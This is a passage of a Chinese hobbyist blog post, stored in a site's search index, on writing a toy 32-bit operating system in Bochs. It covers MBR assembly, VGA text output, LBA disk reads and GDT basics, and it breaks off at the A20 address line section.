<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>关于作死试图搓一个32位操作系统不得不说的事</title>
    <link href="/2023/11/20/OS/"/>
    <url>/2023/11/20/OS/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在一切之前"><a href="#0x0-写在一切之前" class="headerlink" title="0x0:写在一切之前"></a>0x0:写在一切之前</h1><p>本来在笔者的计划中，手搓一个简易的操作系统是在暑假就该完成的事情，结果笔者是只懒🐶，而且当时一直在搞fuzz和iot<del>（但好像也没搞出什么东西来，只是单纯的在摸鱼罢了）</del>。</p><p>然后呢笔者最近想重开kernel，静下心来好好学点内核。但掐指一算好像还有两个星期就到期末周了，学个🐕8</p><p>👴当🐓立断不如看点书，参考一下《操作系统真象还原》，基础能打一点是一点。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="bochs安装"><a href="#bochs安装" class="headerlink" title="bochs安装"></a>bochs安装</h3><p><a href="https://sourceforge.net/projects/bochs/files/bochs/">Bochs x86 PC emulator - Browse &#x2F;bochs at SourceForge.net</a></p><p>找个版本下载并解压</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/your/path/yo/bochs</span> <span class="hljs-params">--enable-debugger</span> <span class="hljs-params">--enable-disasm</span> <span class="hljs-params">--enable-iodebug</span> <span class="hljs-params">--enable-x86-debugger</span> <span class="hljs-params">--with-x</span> <span class="hljs-params">--with-x11</span><br>$ make<br>$ make install<br></code></pre></td></tr></table></figure><p><code>bochs</code>支持自带的<code>debug</code>和<code>gdb</code>（编译的时候-<code>-enable-debugger</code>变成<code>--enable-gdb-stub</code>），但gdb这适配做的是一坨shit，建议直接用<code>bochs</code>自带的</p><p>配置文件，抄的A3👴的呜呜，把<code>share/doc/bochs/bochsrc-sample.txt</code>里的改一改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">megs: 32<br>romimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/BIOS-bochs-latest<br>vgaromimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/VGABIOS-lgpl-latest<br>ata0-master: <span class="hljs-attribute">type</span>=disk, <span class="hljs-attribute">mode</span>=flat, <span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;img.img&quot;</span><br>cpu: <span class="hljs-attribute">model</span>=pentium, <span class="hljs-attribute">count</span>=1, <span class="hljs-attribute">ips</span>=50000000, <span class="hljs-attribute">reset_on_triple_fault</span>=1, <span class="hljs-attribute">ignore_bad_msrs</span>=1, <span class="hljs-attribute">msrs</span>=<span class="hljs-string">&quot;msrs.def&quot;</span><br><span class="hljs-comment"># following lines need to be added by yourself</span><br>keyboard: <span class="hljs-attribute">type</span>=mf, <span class="hljs-attribute">serial_delay</span>=250 <span class="hljs-attribute">keymap</span>=./bochs/share/bochs/keymaps/x11-pc-us.map<br><span class="hljs-comment">#sound: driver=default, waveout=/dev/dsp. wavein=, midiout= </span><br></code></pre></td></tr></table></figure><h3 id="bochs-调试"><a href="#bochs-调试" class="headerlink" title="bochs 调试"></a>bochs 调试</h3><p>大部分调试命令和gdb一样，有几个特殊的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> mode:每次 CPU 变换模式时就提示，模式是指保护模式、实模式，比如从实模式进入到保护模式时会有提示<br><br><span class="hljs-keyword">show</span> <span class="hljs-type">int</span>:每次有中断时就提示 p 同时显示三种中断类型，这 三 种中断类型包括“ softint ”、“ extint ”和“ iret ”。可以单独显示某类中断，如执行 <span class="hljs-keyword">show</span> softint 只显示软件主动触发的中断， <span class="hljs-keyword">show</span> extint 则只显示来自外部设备的中断， <span class="hljs-keyword">show</span> iret 只显示 iretd 指令有关的信息 <br><br>reg：常用寄存器的值<br><br><span class="hljs-keyword">info</span> gdt/ldt/CPU/idt/ivt：全局符号描述表/局部符号描述表/所有CPU寄存器的值/显示中断向量表IDT/显示中断向量表IVT<br><br>sreg：查看段寄存器的值<br>dreg：查看调试寄存器的值<br>creg：查看控制寄存器的值<br></code></pre></td></tr></table></figure><h3 id="pack-start"><a href="#pack-start" class="headerlink" title="pack &amp; start"></a>pack &amp; start</h3><p>pack.sh</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">!/bin/bash<br>nasm -o ./mbr.bin ./mbr.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin <span class="hljs-attribute">of</span>=./img.img <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>./bochs/bin/bochs -f ./bochsrc.disk<br></code></pre></td></tr></table></figure><h1 id="0x1-开始调教MBR（bushi）🥵"><a href="#0x1-开始调教MBR（bushi）🥵" class="headerlink" title="0x1:开始调教MBR（bushi）🥵"></a>0x1:开始调教MBR（bushi）🥵</h1><h2 id="about-BIOS"><a href="#about-BIOS" class="headerlink" title="about BIOS"></a>about BIOS</h2><p>众所周知，当你按下神圣的开机键，<code>CPU</code>通上电之后以实模式启动，第一个运行的程序便是<code>BIOS</code>，<code>BIOS</code>将<code>MBR</code>载入，将控制权交给了<code>MBR</code></p><p>于是便产生了玄学三问：<code>BIOS</code>是什么？他从哪来？为什么他先执行？</p><p>首先先看张《操作系统真象还原》里的图，关于实模式下的内存分布</p><p><img src="/img/OS/0.png" alt="img"></p><p><code>BIOS</code>：<code>Basic Input &amp; Output System</code>即基本输入输出系统，主要工作便是检测、初始化硬件，还建立了伟大的中断向量表</p><p>但是通过图可知，<code>BIOS</code>才<code>0xf0000-0xfffff</code>共计<code>64KB</code>大小，不可能兼顾到所有的硬件设备，而且此时运行在实模式下，也没有这个必要，所以只要挑一些重要的，能保证计算机运行的基本硬件IO操作就行了。此为<code>BIOS</code>名称由来</p><p>至于<code>BIOS</code>在哪里，这玩意一直在主板上的<code>ROM</code>里，通电的时候<code>ROM</code>就被映射在<code>0xf0000-0xfffff</code>,只要访问了这里就算访问了<code>BIOS</code>,这个映射完全是由硬件完成的。</p><p>But <code>BIOS</code>也算是个程序，所以也是有入口的，此处便是<code>0xffff0</code>。电脑开机的一瞬间，CPU的<code>cs:ip</code>寄存器被赋值为<code>0xf000</code>:<code>0xfff0</code>。然后开机时处于实模式，段基址<code>cs</code>要左移四位，所以此时<code>cs:ip</code>等效地址为<code>0xffff0</code>，为<code>BIOS</code>入口。</p><p>但是<code>0xffff0-0xfffff</code>这短短的16字节显然并不能干什么，通过调试发现，<code>0xffff0</code>处的指令实为跳转指令，跳到<code>0xfe05b</code>处。这才是<code>BIOS</code>真正开始的地方</p><p><img src="/img/OS/1.png" alt="img"></p><p>当初始化硬件和建立中断向量表后，<code>BIOS</code>将自己最后的波纹用于检查0盘0道1扇区（实则是0盘0道0扇区，CHS表示方式中1扇区就是第一个扇区）最后两个字节是否为<code>magic number</code> <strong>0x55</strong>和<strong>0xaa</strong>（你问👴为什么不是114514这种恶臭的杂修~，👴知道个der，反正书里写了）。如果是，就会把这个扇区的<code>data</code>加载到<code>0x7c00</code>,随后跳转执行。此处执行的，便是MBR。如果你问完<code>magic number</code>又要问👴为什么是<code>0x7c00</code>,👴只能说是<code>IBM生产的PC5150的ROM BIOS 中的INT19H</code>的历史遗留问题，当时的<code>BIOS</code>按<code>32KB</code>的大小来设计，<code>32KB</code>就是<code>0x8000</code>，<code>MBR</code>的大小是512字节，同时作为一个程序需要使用栈，姑且算<code>1KB</code>好了。<code>1KB</code>是多少，<code>0x400</code>，所以<code>0x8000</code> - <code>0x400</code>是<code>0x7c00</code>。</p><h2 id="MBRの初次调教"><a href="#MBRの初次调教" class="headerlink" title="MBRの初次调教"></a>MBRの初次调教</h2><p>写了这么多终于到<code>MBR</code>了，妈妈生的</p><p><code>MBR（Master Boot Recode）</code>——主引导记录，是我们能最早支配的程序，因为<code>BIOS</code>这byd是写死的。</p><p>需要注意的是，MBR的大小必须是512字节，因为只有这样才能保证0道0盘1扇区的最后两个字节为<code>magic</code>。</p><p>先写一个在屏幕上输出字符的<code>MBR</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00    ;因为MBR被加载到0x7c00，所以将整个code作为section，并将vstart赋值0x7c00，这样计算绝对地址时就会以0x7c00为base<br>mov ax,cs                ;段寄存器不能用立即数，只能通过寄存器或者内存进行赋值<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600             ;上卷全部行，清屏<br>mov bx,0x700<br>mov cx,0                 ;左上角（0，0）<br>mov dx,0x184f          ;右下角（80，25）<br>int 0x10                 ;BIOS提供的0x10中断<br><br> mov ah,3                 ;获取光标位置<br>mov bh,0<br>int 0x10<br><br>mov ax,message           ;es:bp是字符串地址，因为前面es已经被初始化，所以cs=es<br>mov bp,ax<br><br>mov cx,0x20              ;length <br>mov ax,0x1301            ;ah:01 显示字符串，光标跟随移动<br>mov bx,0x2               ;bl:02 黑底绿字<br>int 0x10 <br><br>jmp $                    ;$表示当前行，程序在这边卡住<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0    ;$$表示section的位置，填充510的length，补上magic number<br>db 0x55,0xaa   <br></code></pre></td></tr></table></figure><p>运行后可以康康</p><p><img src="/img/OS/2.png" alt="img"></p><p>输出的时候写了个循环，优化一下，不用算length了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov ax,message<br>mov bp,ax<br><br>.korey_print:<br><br> mov ah,3<br>mov bh,0<br>int 0x10<br><br>mov cx,1<br>mov ax,0x1301<br>mov bx,0x2<br>int 0x10<br>        <br>    inc bp<br>    mov ax,[bp]<br>    test ax,ax<br>    jnz .korey_print<br>       <br>jmp $<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><h2 id="变成显存形状的MBR"><a href="#变成显存形状的MBR" class="headerlink" title="变成显存形状的MBR"></a>变成显存形状的MBR</h2><p>前面的<code>MBR</code>，使用<code>BIOS</code>提供的0x10中断完成了字符输出，说实话还是依赖于中断向量表。</p><p>But，中断向量表只存在于实模式，以后还是要进入保护模式的捏，但保护模式就莫得中断向量表了，也就无法使用int 0x10来完成输出了。</p><p>那该怎么办捏</p><p>答案就是直接对显卡上手。</p><p>显卡显卡，就是用来图像输出的卡。而显卡中的显存，是显卡提供给我们的接口。关于实模式的内存分布中提到<code>0xA0000</code>-<code>0xC7FFF</code>是显存的区域，事实上，当你直接在显存上写东西。显卡便会在屏幕上输出内容</p><p><img src="/img/OS/3.png" alt="img"></p><p>下面是在显存文本模式区域（一个字节表示输出字符，一个字符表示其属性）输出<code>“korey&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;k&#x27;<br>mov byte [gs:0x01],0xa4   ;A：背景色绿色   4：前景色红色<br><br>mov byte [gs:0x02],&#x27;o&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;r&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;e&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;y&#x27;<br>mov byte [gs:0x09],0xa4<br><br>jmp $<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p><img src="/img/OS/4.png" alt="img"></p><h2 id="MBR-和我交往吧，磁盘仙贝！😋"><a href="#MBR-和我交往吧，磁盘仙贝！😋" class="headerlink" title="MBR:和我交往吧，磁盘仙贝！😋"></a>MBR:和我交往吧，磁盘仙贝！😋</h2><p><code>BIOS</code>只能把0柱面0磁道1扇区512字节大小的<code>MBR</code>载入内存，那么问题来了，<code>MBR</code>执行完了，然后干什么嘞。</p><p>其实我们都知道，<code>MBR</code>也不过是一个中继程序而已，然既然<code>MBR</code>是从磁盘导入的，那我们能不能用<code>MBR</code>从磁盘导入别的<code>data</code>呢？</p><p>这就涉及到磁盘通信问题惹</p><p>先贴一张表，出自《操作系统真象还原》</p><p><img src="/img/OS/5.png" alt="img"></p><p>先来看看一些常用的端口</p><ul><li>data <code>0x1f0/0x170</code>：负责管理数据，唯一一个16位的</li><li>error&#x2F;feature <code>0x1f1/0x171</code>：读取硬盘失败时记录失败信息&#x2F;写入硬盘时存储命令需要的额外参数</li><li>Sector count <code>0x1f2/0x172</code>：指定待写入或待读取的扇区</li><li>device <code>0x1f6/0x176</code>：杂项寄存器，什么功能都带点。图来自《操作系统真象还原》</li><li><img src="/img/OS/6.png" alt="img"></li><li>status （读硬盘时）<code>0x17f/0x177</code>：状态寄存器。图来自《操作系统真象还原》</li><li><img src="/img/OS/7.png" alt="img"></li><li>command（写硬盘时）<code>0x17f/0x177</code>：储存让硬盘执行的命令。常用的就三个</li><li>identify: 0xEC 硬盘识别<br>read sector: 0x20 读取扇区<br>write sector: 0x30 写入扇区</li></ul><p>在物理层面上，硬盘内寻址是通过”柱面．磁头．扇区”来定位的<code>Cylinder Head Sector</code>，简称为 <code>CHS</code> ，这对读写的磁头很形象，但对于可爱的<code>MBR</code>小姐就太抽象了。于是出现了<code>LBA</code>，逻辑块地址<code>（logic block address）</code>，不考虑扇区所在的物理结构。</p><p>LBA又分LBA28（最大支持128G）和LBA48（最大支持128PB），我们这边就讨论LBA28</p><p>所以三个8位的寄存器存放<code>LBA28</code>的低24位，高4位存放在<code>device</code>寄存器的低4位</p><p>在<code>x86</code>架构中，与<code>IO</code>设备通信时一般会用<code>in/out</code>这两个指令，从端口读出数据或者向端口写入数据。并且默认<code>dx</code>寄存器存储端口号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dx,0x1f0<br>in dx,al         ;这样就是向0x1f0端口写入al的值了<br></code></pre></td></tr></table></figure><p>至于如何从磁盘读入数据写入内存的大致步骤笔者就不赘述了，可以参考书籍</p><p>下面就是代码罢了</p><p>boot.inc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOADER_BASE_ADDR equ 0x900            ;0x500-0x7bff都是可用区域<br>LOADER_START_SECTOR equ 0x2           ;扇区2<br>%include &quot;boot.inc&quot;<br>SECTION MBR vstart=0x7c00<br>mov ax,cs                         ;initial<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600                      ;通过上卷清空屏幕<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov eax,LOADER_START_SECTOR       ;eax = 2<br>mov bx,LOADER_BASE_ADDR           ;bx = 0x900<br>mov cx,1                          ;待读取扇区数 = 1<br>call rd_disk_m_16<br><br>jmp LOADER_BASE_ADDR<br><br>rd_disk_m_16:<br>mov esi,eax                       ;保存参数<br>mov di,cx<br> <br>mov dx,0x1f2                      <br>mov al,cl         <br>out dx,al                         ;传个sector count 待读取扇区数为1<br><br>mov eax,esi<br><br>mov dx,0x1f3<br>out dx,al                         ;LAB low<br><br>mov cl,8<br>shr eax,cl<br>mov dx,0x1f4<br>out dx,al                         ;LAB mid<br>    <br>    shr eax,cl                        <br>    mov dx,0x1f5<br>    out dx,al                         ;LAB high<br>    <br>shr eax,cl<br>and al,0x0f<br>or al,0xe0<br>mov dx,0x1f6<br>out dx,al                         ;lba 第 24-27位。设置 7-4 位为 1110 ，表示 lba 模式            <br><br>mov dx,0x1f7<br>mov al,0x20<br>out dx,al                         ;写入读取命令<br><br>.not_ready:                           ;还是0x1f7端口<br>nop<br>in al,dx<br>and al,0x88                       ;第 4 位为 1 表示硬盘控制器已准备好数据传输  第 7 位为 1 表示硬盘忙<br>cmp al,0x08 <br>jnz .not_ready                    ;直到准备好为止<br><br>mov ax,di                         <br>mov dx,256<br>mul dx<br>mov cx,ax                         ;di 为要读取的扇区数，一个扇区有512字节每次读入一个字116共需 di*512/2次，所以 di*<br>mov dx,0x1f0                      <br><br>.go_on_read:<br>in ax,dx<br>mov [bx],ax<br>add bx,2<br>loop .go_on_read<br>ret<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p>当然此时扇区2里面一点数据都没有，我们可以随便写一点loader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov sp,LOADER_BASE_ADDR<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;L&#x27;<br>mov byte [gs:0x01],0xa4  <br><br>mov byte [gs:0x02],&#x27;O&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;A&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;D&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;E&#x27;<br>mov byte [gs:0x09],0xa4<br><br>mov byte [gs:0x0a],&#x27;R&#x27;<br>mov byte [gs:0x0b],0xa4<br><br>jmp $<br></code></pre></td></tr></table></figure><p>编译后dd进磁盘的扇区2，所以pack.h也得改一改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/bin/bash</span><br>nasm -o ./mbr.bin ./mbr.S<br>nasm -o ./loader.bin ./load.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br>dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>然后就可以愉快的跳到0x900执行loader了</p><p><img src="/img/OS/8.png" alt="img"></p><p>但是这个loader并没有任何意义，因为他是在实模式下运行的，只是为了测试MBR的功能性。</p><h1 id="0x2-保护模式"><a href="#0x2-保护模式" class="headerlink" title="0x2:保护模式"></a>0x2:保护模式</h1><h2 id="段描述符（Segment-Descriptor）"><a href="#段描述符（Segment-Descriptor）" class="headerlink" title="段描述符（Segment Descriptor）"></a>段描述符（Segment Descriptor）</h2><p>随着时间的推移，8086进化成了80386，地址总线也从16位变成32位，but，段寄存器却还是16位从未变过</p><p>这是因为关于段的信息被存放在了内存中一块叫做<strong>段描述符</strong>的地方</p><p><img src="/img/OS/9.png" alt="img"></p><p>段描述符长8字节，64位，里面的各个位的具体含义如下</p><ul><li>0-15：段界限低16位</li><li>16-31：段基址低16位</li><li>32-39：段基址中8位</li><li>40-43：type 指定本描述符的类型，用于表示内存段和门的子类型。图出自《操作系统真象还原》</li><li><img src="/img/OS/10.png" alt="img"></li><li>44：S 0&#x2F;1 —&gt; 系统段&#x2F;数据段</li><li>45-46：DPL ，即<code>Descriptor Privilege Level</code>，描述符特权级，分0、1、2、3，数字越小，特权级越大</li><li>47：P <code>Present</code>，即段是否存在 0&#x2F;1 —&gt; 不存在&#x2F;存在</li><li>48-51：段界限高4位</li><li>52：AVL，即<code>AVaiLable</code>，可用的</li><li>53：L，是否为64位代码段 0&#x2F;1 —&gt; 否&#x2F;是</li><li>54：D&#x2F;B，表示有效地址（段内偏移地址）和操作数大小 0&#x2F;1 —&gt; 16位&#x2F;32位</li><li>55：G，粒度 0&#x2F;1 —&gt; 1B&#x2F; 4KB</li><li>56-63：段基址高8位</li></ul><p>你要问👴为什么段界限和段基址会被拆成这个JB样子，👴只能说兼容、兼容、还是牛魔的兼容</p><h2 id="全局描述符表GDT（Global-Descriptor-Table）"><a href="#全局描述符表GDT（Global-Descriptor-Table）" class="headerlink" title="全局描述符表GDT（Global Descriptor Table）"></a>全局描述符表GDT（Global Descriptor Table）</h2><p>一个段描述符只能描述一段内存，but内存被分成许多段是无法避免的，所以这时候全局描述符表就出现了，一个内存中专门用来存放段描述符的地方。</p><p>程序都可以在GDT中定义自己的段描述符，CPU通过一个专门指向GDT的寄存器<code>GDTR</code>和一个“下标”，也就是<code>selector</code>选择子，在GDT中精准的找到自己需要的段描述符</p><h3 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h3><p>48位寄存器，专门用来存储GDT的内存地址和大小,下图出自《操作系统真象还原》</p><p><img src="/img/OS/11.png" alt="img"></p><p>前16位是界限值，2^16 &#x3D; 65536，所以前16位的<code>max value</code> &#x3D; 65536 -1 &#x3D; 0xffff</p><p><code>and</code>一个段描述符长8字节，所以一个<code>GDT</code>最多存储8192个段描述符</p><p><strong>lgdt</strong>:对GDTR特攻指令，具体操作为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lgdt 48位内存数据<br></code></pre></td></tr></table></figure><h3 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h3><p>选择子是16位，下图出自《操作系统真象还原》</p><p><img src="/img/OS/12.png" alt="img"></p><p>0-1位：RPL，请求特权级，00为0，11为3</p><p>2位：TI，即<code>Table Indicator</code>，0为<code>GDT</code>中索引描述符，1为<code>LDT</code>（有全局当然也会有局部，<code>Local Descriptor Table</code>，局部描述符表）中索引描述表</p><p>高13位是索引值，2^13 &#x3D; 8192，即最多能有8192个段描述符，和上文相符</p><p><strong>PS：GDT中第0个索引值不可用，因为selector未初始化时为0</strong></p><p>至于<code>LDT</code>，和<code>GD</code>T类似，就不再赘述</p><h2 id="打开A20地址线"><a href="#打开A20地址线" class="headerlink" title="打开A20地址线"></a>打开A20地址线</h2><p>先来说说8086的地址回绕</p><h3 id="8086地址回绕"><a href="#8086地址回绕" class="headerlink" 